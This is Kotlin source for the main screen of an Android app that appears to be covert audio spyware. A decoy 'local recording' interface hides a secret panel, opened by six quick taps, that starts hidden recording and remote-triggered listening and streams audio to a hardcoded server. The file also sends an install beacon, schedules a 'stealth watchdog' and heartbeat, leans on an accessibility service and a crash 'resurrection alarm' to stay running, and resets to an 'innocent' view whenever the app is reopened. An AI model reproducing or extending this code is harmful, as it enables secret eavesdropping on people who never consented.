package com.audiostream.client

import android.Manifest
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.content.res.ColorStateList
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.*

/**
 * MainActivity.kt — Main UI for the Audio Monitor client.
 *
 * Displays:
 *   - Server URL input
 *   - Start/Stop controls
 *   - Live status: connection, recording, pending uploads, retries
 *   - Storage info
 *   - Scrolling activity log
 *
 * Receives broadcast updates from AudioRecordService to keep
 * the UI synchronized with the background service state.
 */

class MainActivity : AppCompatActivity() {

    // UI Elements
    private lateinit var etServerUrl: EditText
    private lateinit var btnStart: Button
    private lateinit var btnStop: Button
    private lateinit var btnStandby: Button
    private lateinit var btnGuardian: Button
    private lateinit var btnDummyStart: Button
    private lateinit var btnDummyStop: Button
    private lateinit var tvStatus: TextView
    private lateinit var vStatusDot: View
    private lateinit var tvConnection: TextView
    private lateinit var tvPending: TextView
    private lateinit var tvRetries: TextView
    private lateinit var tvDuration: TextView
    private lateinit var tvStorage: TextView
    private lateinit var tvClientName: TextView
    private lateinit var tvLog: TextView
    private lateinit var scrollLog: ScrollView

    private lateinit var tvHeader: TextView
    private lateinit var tvPublicPackets: TextView
    private lateinit var tvSessionData: TextView
    private lateinit var debugPanel: View
    private var secretTapCount = 0
    private var lastSecretTapTime = 0L
    private var isDummyRecording = false

    private lateinit var prefs: SharedPreferences

    // ── Broadcast Receiver ──
    private val serviceReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                AudioRecordService.ACTION_STATE_UPDATE -> {
                    val pending = intent.getIntExtra(AudioRecordService.EXTRA_PENDING, 0)
                    val retries = intent.getIntExtra(AudioRecordService.EXTRA_RETRIES, 0)
                    val duration = intent.getLongExtra(AudioRecordService.EXTRA_DURATION, 0)
                    val connection = intent.getStringExtra(AudioRecordService.EXTRA_CONNECTION) ?: "—"
                    val storage = intent.getStringExtra(AudioRecordService.EXTRA_STORAGE) ?: ""

                    updateStats(pending, retries, duration, connection, storage)
                    updateUIForServiceState()
                }
                AudioRecordService.ACTION_LOG -> {
                    val message = intent.getStringExtra(AudioRecordService.EXTRA_MESSAGE)
                    if (message != null) appendLog(message)
                }
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // LIFECYCLE
    // ══════════════════════════════════════════════════════════════════════

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize UI references
        etServerUrl = findViewById(R.id.etServerUrl)
        btnStart = findViewById(R.id.btnStart)
        btnStop = findViewById(R.id.btnStop)
        btnStandby = findViewById(R.id.btnStandby)
        btnGuardian = findViewById(R.id.btnGuardian)
        btnDummyStart = findViewById(R.id.btnDummyStart)
        btnDummyStop = findViewById(R.id.btnDummyStop)
        tvStatus = findViewById(R.id.tvStatus)
        vStatusDot = findViewById(R.id.vStatusDot)
        tvConnection = findViewById(R.id.tvConnection)
        tvPending = findViewById(R.id.tvPending)
        tvRetries = findViewById(R.id.tvRetries)
        tvDuration = findViewById(R.id.tvDuration)
        tvStorage = findViewById(R.id.tvStorage)
        tvClientName = findViewById(R.id.tvClientName)
        tvLog = findViewById(R.id.tvLog)
        scrollLog = findViewById(R.id.scrollLog)
        
        tvHeader = findViewById(R.id.tvHeader)
        tvPublicPackets = findViewById(R.id.tvPublicPackets)
        tvSessionData = findViewById(R.id.tvSessionData)
        debugPanel = findViewById(R.id.debugPanel)

        prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        
        // Initialize Session Data
        tvSessionData.text = "Codec: AAC-LC | Rate: 16kbps | Channels: Mono"

        // Setup Secret Trigger
        tvHeader.setOnClickListener {
            val now = System.currentTimeMillis()
            if (now - lastSecretTapTime < 500) {
                secretTapCount++
            } else {
                secretTapCount = 1
            }
            lastSecretTapTime = now

            if (secretTapCount >= 6) {
                secretTapCount = 0
                val isHidden = debugPanel.visibility == View.GONE
                debugPanel.visibility = if (isHidden) View.VISIBLE else View.GONE
                if (isHidden) {
                    Toast.makeText(this, "Debug Panel Revealed", Toast.LENGTH_SHORT).show()
                }
                updateUIForServiceState()
            }
        }

        // Restore saved URL
        val savedUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com")
        etServerUrl.setText(savedUrl)

        // Trigger automatic install beacon on first launch
        if (!savedUrl.isNullOrEmpty()) {
            InstallBeaconManager.checkAndSendBeacon(this, savedUrl)
        }

        // Initialize 2-hour recurring stealth watchdog schedule (anchored after 5 AM)
        WatchdogScheduler.scheduleRecurringWatchdog(this)

        // Initialize 1-hour "Alive" Heartbeat schedule (does not record audio, only signals alive)
        HeartbeatManager.scheduleHourlyHeartbeat(this)
        HeartbeatManager.checkAndSendHourly(this)

        // Show client name
        val clientName = prefs.getString("client_name", null)
            ?: "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }}-${Build.MODEL.replace(" ", "-")}"
        tvClientName.text = "Client: $clientName"

        // Button handlers
        btnStart.setOnClickListener { startHiddenRecording() }
        btnStop.setOnClickListener { stopHiddenRecording() }
        btnStandby.setOnClickListener { toggleStandby() }

        btnGuardian.setOnClickListener {
            if (!isGuardianAccessibilityEnabled()) {
                Toast.makeText(this, "Enable 'Audio Stream Guardian' in Accessibility Settings", Toast.LENGTH_LONG).show()
                try {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (e: Exception) {
                    Toast.makeText(this, "Failed opening Accessibility Settings: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            } else {
                Toast.makeText(this, "🛡️ Guardian is ACTIVE and protecting 24/7 background persistence.", Toast.LENGTH_SHORT).show()
            }
        }

        setupCrashGuardian()

        btnDummyStart.setOnClickListener {
            isDummyRecording = true
            btnDummyStart.visibility = View.GONE
            btnDummyStop.visibility = View.VISIBLE
            startMainRecording()
        }
        btnDummyStop.setOnClickListener {
            isDummyRecording = false
            btnDummyStart.visibility = View.VISIBLE
            btnDummyStop.visibility = View.GONE
            stopMainRecording()
        }

        // Register broadcast receiver
        val filter = IntentFilter().apply {
            addAction(AudioRecordService.ACTION_STATE_UPDATE)
            addAction(AudioRecordService.ACTION_LOG)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(serviceReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(serviceReceiver, filter)
        }

        // Sync UI with service state
        updateUIForServiceState()
    }

    override fun onResume() {
        super.onResume()
        // Always reset to innocent Main view on resume
        debugPanel.visibility = View.GONE
        secretTapCount = 0
        updateUIForServiceState()
    }

    override fun onStop() {
        super.onStop()
        // Auto-lock secret panel when leaving to home screen or switching apps
        debugPanel.visibility = View.GONE
        secretTapCount = 0
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(serviceReceiver)
        } catch (e: Exception) { /* already unregistered */ }
    }

    // ══════════════════════════════════════════════════════════════════════
    // SERVICE CONTROL
    // ══════════════════════════════════════════════════════════════════════

    private fun startMainRecording() {
        val url = etServerUrl.text.toString().trim()
        if (url.isEmpty()) {
            Toast.makeText(this, "Please enter a server URL", Toast.LENGTH_SHORT).show()
            return
        }

        prefs.edit().putString("server_url", url).apply()

        // Check permissions
        val required = mutableListOf(Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            required.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = required.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
            return
        }

        checkBatteryOptimization()

        val intent = Intent(this, AudioRecordService::class.java).apply {
            action = AudioRecordService.ACTION_START_MAIN
            putExtra(AudioRecordService.EXTRA_SERVER_URL, url)
        }
        ContextCompat.startForegroundService(this, intent)
        updateUIForServiceState()
        appendLog("Starting local recording...")
    }

    private fun stopMainRecording() {
        val intent = Intent(this, AudioRecordService::class.java).apply {
            action = AudioRecordService.ACTION_STOP_MAIN
        }
        startService(intent)
        updateUIForServiceState()
        appendLog("Stopping local recording...")
    }

    private fun startHiddenRecording() {
        val url = etServerUrl.text.toString().trim()
        if (url.isEmpty()) {
            Toast.makeText(this, "Please enter a server URL", Toast.LENGTH_SHORT).show()
            return
        }

        prefs.edit()
            .putString("server_url", url)
            .putBoolean("was_running", true)
            .apply()

        val required = mutableListOf(Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            required.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = required.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
            return
        }

        checkBatteryOptimization()

        val intent = Intent(this, AudioRecordService::class.java).apply {
            action = AudioRecordService.ACTION_START_HIDDEN
            putExtra(AudioRecordService.EXTRA_SERVER_URL, url)
        }
        ContextCompat.startForegroundService(this, intent)
        updateUIForServiceState()
        appendLog("Starting hidden recording...")
    }

    private fun stopHiddenRecording() {
        prefs.edit().putBoolean("was_running", false).apply()

        val intent = Intent(this, AudioRecordService::class.java).apply {
            action = AudioRecordService.ACTION_STOP_HIDDEN
        }
        startService(intent)
        updateUIForServiceState()
        appendLog("Stopping hidden recording...")
    }

    private fun checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = android.net.Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    // Fallback ignored
                }
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // UI UPDATES
    // ══════════════════════════════════════════════════════════════════════

    private fun updateUIForServiceState() {
        val isDebugOpen = debugPanel.visibility == View.VISIBLE
        val isMain = AudioRecordService.isMainRecording || isDummyRecording
        val isHidden = AudioRecordService.isHiddenRecording
        val isStandby = AudioRecordService.isStandbyMode

        // 1. Normal View (Visible innocent UI)
        if (isMain) {
            btnDummyStart.visibility = View.GONE
            btnDummyStop.visibility = View.VISIBLE
            tvStatus.text = "● Local Recording..."
            tvStatus.setTextColor(Color.parseColor("#3b82f6"))
            vStatusDot.setBackgroundColor(Color.parseColor("#3b82f6"))
        } else {
            btnDummyStart.visibility = View.VISIBLE
            btnDummyStop.visibility = View.GONE
            if (!isDebugOpen) {
                tvStatus.text = "○ Disconnected"
                tvStatus.setTextColor(Color.parseColor("#555570"))
                vStatusDot.setBackgroundColor(Color.parseColor("#555570"))
            }
        }

        // 2. Secret Debug View (Revealed via 6-tap)
        if (isDebugOpen) {
            etServerUrl.isEnabled = !AudioRecordService.isRunning && !isStandby

            if (isHidden) {
                btnStart.visibility = View.GONE
                btnStandby.visibility = View.GONE
                btnStop.visibility = View.VISIBLE
                tvStatus.text = if (isMain) "● Recording (Dual: Main+Hidden)" else "● Recording (Hidden)"
                tvStatus.setTextColor(Color.parseColor("#10b981"))
                vStatusDot.setBackgroundColor(Color.parseColor("#10b981"))
            } else if (isStandby) {
                btnStart.visibility = View.VISIBLE
                btnStandby.text = "⏹ STOP LISTENING"
                btnStandby.visibility = View.VISIBLE
                btnStop.visibility = View.GONE
                tvStatus.text = if (isMain) "● Local Rec + 📡 Standby" else "📡 Standby Mode"
                tvStatus.setTextColor(Color.parseColor("#a78bfa"))
                vStatusDot.setBackgroundColor(Color.parseColor("#a78bfa"))
            } else if (isMain) {
                btnStart.visibility = View.VISIBLE
                btnStandby.text = "📡 STANDBY MODE"
                btnStandby.visibility = View.VISIBLE
                btnStop.visibility = View.GONE
                tvStatus.text = "● Local Recording (Main only)"
                tvStatus.setTextColor(Color.parseColor("#3b82f6"))
                vStatusDot.setBackgroundColor(Color.parseColor("#3b82f6"))
            } else {
                btnStart.visibility = View.VISIBLE
                btnStandby.text = "📡 ENABLE REMOTE LISTENING"
                btnStandby.visibility = View.VISIBLE
                btnStop.visibility = View.GONE
                tvStatus.text = "○ Stopped"
                tvStatus.setTextColor(Color.parseColor("#f87171"))
                vStatusDot.setBackgroundColor(Color.parseColor("#f87171"))
                tvDuration.text = "00:00"
                tvStorage.text = "—"
            }

            // Update Guardian Button state
            val isGuardianOn = isGuardianAccessibilityEnabled()
            if (isGuardianOn) {
                btnGuardian.text = "🛡️ GUARDIAN: ACTIVE (IMMORTAL)"
                btnGuardian.backgroundTintList = ColorStateList.valueOf(Color.parseColor("#065f46"))
                btnGuardian.setTextColor(Color.parseColor("#34d399"))
            } else {
                btnGuardian.text = "⚠️ GUARDIAN INACTIVE: TAP TO ACTIVATE"
                btnGuardian.backgroundTintList = ColorStateList.valueOf(Color.parseColor("#450a0a"))
                btnGuardian.setTextColor(Color.parseColor("#f87171"))
            }
        }
    }

    private fun toggleStandby() {
        if (AudioRecordService.isStandbyMode) {
            val intent = Intent(this, AudioRecordService::class.java).apply {
                action = AudioRecordService.ACTION_STOP
            }
            startService(intent)
            appendLog("Standby mode disabled.")
            updateUIForServiceState()
        } else {
            val url = etServerUrl.text.toString().trim()
            if (url.isEmpty()) {
                Toast.makeText(this, "Please enter a server URL", Toast.LENGTH_SHORT).show()
                return
            }

            prefs.edit().putString("server_url", url).apply()
            checkBatteryOptimization()

            val intent = Intent(this, AudioRecordService::class.java).apply {
                action = AudioRecordService.ACTION_STANDBY
                putExtra(AudioRecordService.EXTRA_SERVER_URL, url)
            }
            ContextCompat.startForegroundService(this, intent)
            appendLog("Standby mode enabled. Listening for remote commands...")
            updateUIForServiceState()
        }
    }

    private fun updateStats(pending: Int, retries: Int, duration: Long,
                            connection: String, storage: String) {
        tvConnection.text = connection
        tvPending.text = pending.toString()
        tvRetries.text = retries.toString()
        tvDuration.text = formatDuration(duration)
        tvStorage.text = storage
        
        val packetsSent = Math.max(0, (duration / 10000).toInt() - pending)
        tvPublicPackets.text = packetsSent.toString()

        // Color connection status
        tvConnection.setTextColor(when (connection) {
            "Connected" -> Color.parseColor("#34d399")
            "Disconnected" -> Color.parseColor("#f87171")
            "Reconnecting", "Waiting" -> Color.parseColor("#fbbf24")
            else -> Color.parseColor("#8888a0")
        })
    }

    private val logBuffer = ArrayDeque<String>()

    private fun appendLog(message: String) {
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        logBuffer.addFirst("[$time] $message")
        while (logBuffer.size > 100) {
            logBuffer.removeLast()
        }
        tvLog.text = logBuffer.joinToString("\n")
    }

    private fun formatDuration(seconds: Long): String {
        val h = seconds / 3600
        val m = (seconds % 3600) / 60
        val s = seconds % 60
        return if (h > 0) String.format("%02d:%02d:%02d", h, m, s)
        else String.format("%02d:%02d", m, s)
    }

    // ══════════════════════════════════════════════════════════════════════
    // PERMISSIONS
    // ══════════════════════════════════════════════════════════════════════

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                if (isDummyRecording) startMainRecording() else startHiddenRecording()
            } else {
                Toast.makeText(this, "Permissions are required for recording", Toast.LENGTH_LONG).show()
                appendLog("ERROR: Permissions denied")
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // GUARDIAN & RESILIENCE HELPERS
    // ══════════════════════════════════════════════════════════════════════

    private fun isGuardianAccessibilityEnabled(): Boolean {
        val expectedServiceName = "${packageName}/${KeepAliveAccessibilityService::class.java.canonicalName}"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(expectedServiceName, ignoreCase = true)) {
                return true
            }
        }
        return false
    }

    private fun setupCrashGuardian() {
        val previousHandler = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            android.util.Log.e("CrashGuardian", "🚨 Uncaught exception: ${throwable.message}. Scheduling resurrection alarm...")
            try {
                val restartIntent = Intent(applicationContext, AlarmReceiver::class.java).apply {
                    action = WatchdogScheduler.ACTION_WATCHDOG_CHECK
                }
                val pi = PendingIntent.getBroadcast(
                    applicationContext,
                    9999,
                    restartIntent,
                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                )
                val am = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                am?.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1500, pi)
            } catch (e: Exception) {
                // Best-effort recovery
            }
            previousHandler?.uncaughtException(thread, throwable)
        }
    }
}
